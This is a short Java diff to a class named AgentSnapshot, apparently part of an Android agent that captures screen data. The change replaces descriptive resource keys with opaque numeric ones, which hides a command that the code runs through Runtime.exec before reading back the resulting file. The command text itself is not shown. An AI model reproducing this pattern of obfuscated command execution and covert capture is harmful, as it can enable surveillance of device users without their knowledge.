@@ -251,7 +251,7 @@ public class AgentSnapshot extends AgentBase {
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = Messages.getString("AgentSnapshot.1"); //$NON-NLS-1$
+		final String window = Messages.getString("11.1"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -293,12 +293,12 @@ public class AgentSnapshot extends AgentBase {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
-		final String getrawpath = Messages.getString("AgentSnapshot.2"); //$NON-NLS-1$
+		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
 		try {
 			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			final AutoFile file = new AutoFile(path, Messages.getString("AgentSnapshot.3")); //$NON-NLS-1$
+			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
 			if (file.exists()) {
 				return file.read();
 			}
